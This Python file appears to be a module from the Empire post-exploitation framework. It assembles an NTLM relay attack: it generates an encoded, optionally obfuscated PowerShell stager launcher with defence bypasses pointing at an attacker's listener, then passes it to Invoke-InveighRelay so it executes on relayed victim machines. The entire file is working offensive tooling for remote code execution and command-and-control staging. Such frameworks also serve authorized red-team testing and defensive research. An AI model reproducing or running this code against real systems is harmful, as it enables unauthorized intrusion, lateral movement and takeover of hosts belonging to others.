from typing import Dict

from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # staging options
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy_"]
        proxyCreds = params["ProxyCreds"]
        command = params["Command"]
        if (params["Obfuscate"]).lower() == "true":
            launcher_obfuscate = True
        else:
            launcher_obfuscate = False
        launcher_obfuscate_command = params["ObfuscateCommand"]

        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        if command == "":
            if not main_menu.listeners.is_listener_valid(listener_name):
                # not a valid listener, return nothing for the script
                return handle_error_message("[!] Invalid listener: " + listener_name)

            else:
                # generate the PowerShell one-liner with all of the proper options set
                command = main_menu.stagers.generate_launcher(
                    listenerName=listener_name,
                    language="powershell",
                    encode=True,
                    obfuscate=launcher_obfuscate,
                    obfuscation_command=launcher_obfuscate_command,
                    userAgent=user_agent,
                    proxy=proxy,
                    proxyCreds=proxyCreds,
                    bypasses=params["Bypasses"],
                )

                # check if launcher errored out. If so return nothing
                if command == "":
                    return handle_error_message("[!] Error in launcher generation.")

        # set defaults for Empire
        script_end = "\n" + 'Invoke-InveighRelay -Tool "2" -Command \\"%s\\"' % (
            command
        )

        for option, values in params.items():
            if (
                option.lower() != "agent"
                and option.lower() != "listener"
                and option.lower() != "useragent"
                and option.lower() != "proxy_"
                and option.lower() != "proxycreds"
                and option.lower() != "command"
            ):
                if values and values != "":
                    if values.lower() == "true":
                        # if we're just adding a switch
                        script_end += " -" + str(option)
                    else:
                        if "," in str(values):
                            quoted = '"' + str(values).replace(",", '","') + '"'
                            script_end += " -" + str(option) + " " + quoted
                        else:
                            script_end += " -" + str(option) + ' "' + str(values) + '"'

        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
